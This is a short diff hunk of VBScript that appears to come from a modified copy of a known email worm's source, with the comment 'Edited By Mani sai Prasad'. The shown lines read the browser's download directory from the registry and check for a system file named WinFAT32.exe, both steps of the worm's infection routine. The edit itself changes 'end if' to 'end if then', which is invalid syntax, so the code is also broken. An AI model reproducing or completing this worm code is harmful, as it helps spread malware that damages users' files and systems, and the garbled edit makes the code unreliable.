@@ -39,7 +39,7 @@ rem by: Edited By Mani sai Prasad
  downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory") 
  if (downread="") then 
  downread="c:\" 
- end if 
+ end if then
  if (fileexist(dirsystem&"\WinFAT32.exe")=1) then 
  Randomize 
  num = Int((4 * Rnd) + 1) 
